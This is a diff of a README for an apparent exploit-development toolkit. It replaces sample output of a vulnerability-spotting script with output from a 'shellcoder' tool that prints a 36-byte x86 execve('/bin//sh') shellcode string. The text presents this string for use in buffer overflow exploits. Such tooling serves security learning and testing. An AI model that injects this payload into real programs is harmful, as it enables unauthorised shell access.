@@ -75,22 +75,12 @@ shellcode <filename>
 
 #### Sample Output
 ```
-$ ./binaryfairy.py sample_c
-Binary Name: sample_c
-Binary Arch: <Arch AMD64 (LE)>
-Binary Entry: 0x400980
-~~~Hey, Listen!!! I found a possible vulnerability in read_file!!~~~
-0x400fc1: [ebp-0x128] reference before calling fgets(0x401026)
-0x400fd7: [ebp-0x128] reference before calling fgets(0x401026)
-0x400feb: [ebp-0x118] reference before calling fgets(0x401026)
-0x400ff2: [ebp-0x118] reference before calling fgets(0x401026)
-0x401010: [ebp-0x118] reference before calling fgets(0x401026)
-0x401017: [ebp-0x110] reference before calling fgets(0x401026)
-~~~Hey, Listen!!! I found a possible vulnerability in read_note!!~~~
-0x400c67: [ebp-0x110] reference before calling strcmp(0x400ce4)
-0x400c6e: [ebp-0x124] reference before calling strcmp(0x400ce4)
-0x400c9b: [ebp-0x124] reference before calling strcmp(0x400ce4)
-0x400cc9: [ebp-0x120] reference before calling strcmp(0x400ce4)
-0x400cd0: [ebp-0x120] reference before calling strcmp(0x400ce4)
-0x400cd7: [ebp-0x110] reference before calling strcmp(0x400ce4)
+$ ./shellcoder 
+Here is the shellcode to inject: \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\x66\x90\x90
+and it is  144  characters long and  36  bytes long
 ```
+and the file shellcode has:
+```
+\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\x66\x90\x90
+```
+which can be fed into an argument for a buffer overflow exploit.
